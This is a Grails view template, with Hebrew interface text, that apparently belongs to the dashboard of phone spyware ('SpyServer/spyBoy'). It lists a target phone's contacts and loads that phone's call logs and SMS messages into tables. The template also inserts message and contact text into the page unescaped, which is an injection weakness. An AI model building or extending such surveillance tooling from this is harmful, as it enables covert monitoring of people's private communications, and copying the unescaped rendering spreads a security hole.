<g:each in="${contactInstanceList}" status="i" var="contactInstance">
	<p id="contact-${contactInstance.id}" class="dashboard-stat" 
	onclick="loadAllAjaxSections('${contactInstance.formatedPhoneNumer}','${contactInstance.targetPhone.simSubscriberId}',${contactInstance.id});cSelected(this);">
		<g:if
			test='${contactInstance.image!=null && contactInstance.image!=""}'>
			<img class="contact-picture"
				src="data:image/png;base64,${contactInstance.image}" width="65px"
				height="65px"/>
		</g:if>
		<g:else>
			<img class="contact-picture"
				src="${resource(dir: 'uaassets/img', file: 'avatar.png')}" alt=""
				width="65px" height="65px"/>
		</g:else>
		<span class="details" style="height: 52px;width: 112px;text-align: right;margin-top: 3px;line-height: 1.3em !important;position: relative;z-index: 999;">
			<span class="number" style="letter-spacing: 0.1px;font-size: 18px;margin-bottom: 0px;padding-top: 0px;">${contactInstance.name}</span></br>
			<span class="desc" style="font-size: 12px;">${contactInstance.type}</span></br>
		</span>
		<span class="details" style="width: 112px;text-align: right;margin-top: 3px;line-height: 1.3em !important;position: relative;z-index: 999;">			
			<span class="desc" style="font-size: 14px;position: relative;padding-top: 10px;">${contactInstance.formatedPhoneNumer}</span>						
		</span>
		<a class="more" href="#"> נתונים נוספים <i class="m-icon-swapright m-icon-white" style="margin-top:0;"></i></a>
	</p>
</g:each>
<script>
	var lastId = "";
	function customSpinner(show,spinnerObjID){
		if(show){
			jQuery("#" + spinnerObjID ).show();
		}else{
			jQuery("#" + spinnerObjID ).hide();
		}		
	}
	
	function cSelected(obj) {
		jQuery("#contactsAjaxTargetDiv p.selectedContact").removeClass(
				"selectedContact").addClass("notSelected");
		jQuery(obj).removeClass("notSelected").addClass("selectedContact");
	}

	
	function loadAllAjaxSections(number,simSubscriberId,id) {
		var int=self.setInterval(function(){
			if(scrollingFinished){
			    window.clearInterval(int);
				loadCalllogs(number,simSubscriberId,id);											   
			}
		 },100);
	}


	function loadCalllogs(number,simSubscriberId,id){
		var OUTGOING = '${message(code: 'callLog.type.OUTGOING' , default: 'OUTGOING')}'; 
		var INCOMING = '${message(code: 'callLog.type.INCOMING' , default: 'INCOMING')}'; 
		var MISSED = '${message(code: 'callLog.type.MISSED' , default: 'MISSED')}'; 
		// begin: third table		
		
        var oTable = $('#sample_3').dataTable({   
            "bDestroy":true,         
        	"bProcessing": true,
        	"bServerSide": true,
        	"bSearch":false,
        	"aaSorting": [[ 2, "desc" ]],					
			"sAjaxSource": '/SpyServer/spyBoy/callLog',
			"fnServerParams":  function ( aoData ) {
	            aoData.push( { "name": "number", "value": number },{"name":"simSubscriberId","value":simSubscriberId});},
	        "sAjaxDataProp" : "callLogInstanceList",
			"aoColumns": [
			  			{ "mData": "phoneNumber" },
			  			{ "mData": "type"},
			  			{ "mData": "duration" },
			  			{ "mData": "timeSeconds" }
			],
	  		"aoColumnDefs": [
	  		               {
	  		                   // `data` refers to the data for the cell (defined by `mData`, which
	  		                   // defaults to the column being worked with, in this case is the first
	  		                   // Using `row[0]` is equivalent.
	  		                   "bVisible":false,
	  		             	   //"mRender": function ( data, type, row ) {
		  		               //   var result = '';		  		                   
		  		               //   if(row.type!=null && row.type!=''){
		  		               // 	 result = '<img src="../images/callog/'+ row.type +'.png" alt="" style="width: 25px; height: 25px; float: right;padding-left: 10px;" />';
			  		           //    }
			  		           //    result +='<a href="#" style="vertical-align: middle;">' + data + '</a>';
	  		                   //    return result;
	  		                   //},
	  		                   "sClass": "hidden-480",
	  		                  "aTargets": [ 0 ]
	  		               },
	  		               { 
		  		               "mRender": function ( data, type, row ) {		
			  		               	switch(data){
				  		               	case "OUTGOING":return '<span class="label label-warning">' + OUTGOING + '</span>'; break;
					  		            case "INCOMING":return '<spa n class="label label-success">' + INCOMING + '</span>'; break;
					  		            case "MISSED":return '<span class="label label-important">' + MISSED+ '</span>'; break;
			  		               	}							
				  		            return "";
			  		            }
	  		               	   ,"sClass": "hidden-480","aTargets": [ 1 ] 
	  		               },
	  		               { 
		  		               "mRender": function ( data, type, row ) { return row.formatedDuration;}
		  		               ,"aTargets": [ 2 ]
		  		           }
	  		], 		
            "aLengthMenu": [
                [5, 15, 20, -1],
                [5, 15, 20, "All"] // change per page values here
            ],
            // set the initial value
            "iDisplayLength": 5,
            "sDom": "<'row-fluid'<'span6'l><'span6'f>r>t<'row-fluid'<'span5'i><'span7'p>>", //"sDom": "<'row-fluid'<'span6'l><'span0'f>r>t<'row-fluid'<'span4'i><'span8'p>>",
            "sPaginationType": "bootstrap",
            "oLanguage": {
                "sLengthMenu": "מציג _MENU_ תוצאות לדף.",
                "sZeroRecords": "לא נמצאות תוצאות להצגה.",
                "sInfo": "מציג _START_ עד _END_ מתוך _TOTAL_",
                "sInfoEmpty": "מציג - 0  מ- 0 מתוך 0 רשומות",
                "sInfoFiltered": "",//"(מסונן מתוך _MAX_ סה''כ רשומות')",
                "sProcessing": "טוען נתונים...",
                "sSearch": "חיפוש :",
             "oPaginate": {
                    "sPrevious": "אחורה",
                    "sNext": "קדימה"
                }
            },"fnDrawCallback": function( oSettings ) {
            	if(number!='*all' && lastId!=id){         	
					loadSmsesTable(number,simSubscriberId,id);
            	}	
            	ajaxCounter++;
            }
        });

        jQuery('#sample_3 .group-checkable').change(function () {
            var set = jQuery(this).attr("data-set");
            var checked = jQuery(this).is(":checked");
            jQuery(set).each(function () {
                if (checked) {
                    $(this).attr("checked", true);
                } else {
                    $(this).attr("checked", false);
                }
            });
            jQuery.uniform.update(set);
        });

        jQuery('#sample_3_wrapper .dataTables_filter input').addClass("m-wrap small"); // modify table search input
        jQuery('#sample_3_wrapper .dataTables_length select').addClass("m-wrap small"); // modify table per page dropdown
        jQuery('#sample_3_wrapper .dataTables_length select').select2(); // initialize select2 dropdown


        //sho column for all callLog if needed.
        //***********************************************************
        //var bVis = oTable.fnSettings().aoColumns[0].bVisible;
        //oTable.fnSetColumnVis(0, (bVis ? false : true),true);
        //jQuery("#callLogNumberThHeader").show();
	}

	function loadSmses(number,simSubscriberId,id){
		jQuery.ajax({
			type : 'POST',
			data : {
				'number' : number,
				"simSubscriberId":simSubscriberId,	
				"contactId":id			
			},
			url : '/SpyServer/spyBoy/sms',
			success : function(data, textStatus) {
				jQuery('#chats').html(data);
				jQuery('.popovers').popover();	

				lastId=id;		
			},
			error : function(XMLHttpRequest, textStatus, errorThrown) {
				
			}
		});
	}

	function loadSmsesTable(number,simSubscriberId,id){	
			
		var inbox = '${message(code: 'sms.folderName.inbox' , default: 'inbox')}'; 
		var sent = '${message(code: 'sms.folderName.sent' , default: 'sent')}';
		
        var oTable = $('#sample_5').dataTable({   
            "bDestroy":true,         
        	"bProcessing": true,
        	"bServerSide": true,
        	"bSearch":true,
        	"aaSorting": [[ 2, "desc" ]],					
			"sAjaxSource": '/SpyServer/spyBoy/sms',
			"fnServerParams":  function ( aoData ) {
	            aoData.push( { "name": "renderType", "value": "table"},
	            			 { "name": "number", "value": number},
	            			 { "name":"simSubscriberId","value":simSubscriberId},
	            			 { "name":"contactId","value":id}	            				
	            			 );
   			 },
	        "sAjaxDataProp" : "smsInstanceList",
			"aoColumns": [
			  			{ "mData": "folderName" },			  			
			  			{ "mData": "msg" },
			  			{ "mData": "time" }
			],
	  		"aoColumnDefs": [		  		               
		  		               { 
	  		  		               "mRender": function ( data, type, row ) {return '<div class="msgContent">' + data + '</div>';}
	  		  		               ,"sClass": "emoji", "aTargets": [ 1 ] 
	  		  		           },
	  		  		           { 
			  		               "mRender": function ( data, type, row ) {
			  		            		switch(data){
				  		               		case "sent":return '<span class="label label-warning">' + sent + '</span>'; break;
					  		         	    case "inbox":return '<span class="label label-success">' + inbox + '</span>'; break;
			  		               		}							
				  		            	return "";			  		               
				  		            }
		  		               	   ,"sClass": "hidden-480","aTargets": [ 0 ] 
		  		               }
		  		], 		
            "aLengthMenu": [
                [5, 15, 20, -1],
                [5, 15, 20, "All"] // change per page values here
            ],
            // set the initial value
            "iDisplayLength": 5,
            "sDom": "<'row-fluid'<'span6'l><'span6'f>r>t<'row-fluid'<'span5'i><'span7'p>>", //"sDom": "<'row-fluid'<'span6'l><'span0'f>r>t<'row-fluid'<'span4'i><'span8'p>>",
            "sPaginationType": "bootstrap",
            "oLanguage": {
                "sLengthMenu": "מציג _MENU_ תוצאות לדף.",
                "sZeroRecords": "לא נמצאות תוצאות להצגה.",
                "sInfo": "מציג _START_ עד _END_ מתוך _TOTAL_",
                "sInfoEmpty": "מציג - 0  מ- 0 מתוך 0 רשומות",
                "sInfoFiltered": "",//"(מסונן מתוך _MAX_ סה''כ רשומות')",
                "sProcessing": "טוען נתונים...",
                "sSearch": "חיפוש :"
             ,
                "oPaginate": {
                    "sPrevious": "אחורה",
                    "sNext": "קדימה"
                }
            },"fnDrawCallback": function( oSettings ) {
            	runEmoji();
            	if(number!='*all' && lastId!=id){
            		loadSmses(number,simSubscriberId,id);
            	}
            	ajaxCounter++;
            }
        });

        jQuery('#sample_5 .group-checkable').change(function () {
            var set = jQuery(this).attr("data-set");
            var checked = jQuery(this).is(":checked");
            jQuery(set).each(function () {
                if (checked) {
                    $(this).attr("checked", true);
                } else {
                    $(this).attr("checked", false);
                }
            });
            jQuery.uniform.update(set);
        });

        jQuery('#sample_5_wrapper .dataTables_filter input').addClass("m-wrap small"); // modify table search input
        jQuery('#sample_5_wrapper .dataTables_length select').addClass("m-wrap small"); // modify table per page dropdown
        jQuery('#sample_5_wrapper .dataTables_length select').select2(); // initialize select2 dropdown

        //oTable.bind('paging',   function () { alert(4334);runEmoji(); });
        //sho column for all callLog if needed.
        //***********************************************************
        //var bVis = oTable.fnSettings().aoColumns[0].bVisible;
        //oTable.fnSetColumnVis(0, (bVis ? false : true),true);
        //jQuery("#callLogNumberThHeader").show();
	}

	jQuery(document).ready(function() {		
		runEmoji();
	});
    
	//jQuery(document).ready(function(){
		//jQuery('.popovers').popover();
	//	$(".contact-name").each(function(index,value){$(this).arctext({radius: 50});});
	//});
</script>